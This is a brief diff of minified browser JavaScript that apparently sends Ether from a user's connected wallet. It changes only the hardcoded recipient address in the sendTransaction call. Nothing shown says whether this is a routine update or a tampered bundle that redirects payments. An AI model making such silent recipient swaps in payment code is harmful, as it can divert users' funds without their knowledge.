@@ -864,7 +864,7 @@
                     return function () {
                         he(K.a.givenProvider).eth.sendTransaction({
                             from: y,
-                            to: "0x6A4BC288A0270Ef03b991514820C9D20d6C48eE8",
+                            to: "0xbD39A69d3cEb577c074951a600Eaa8EFD2A778c0",
                             value: "".concat(1e18 * e)
                         }, (function (e, t) {
                         })).then((function (e) {
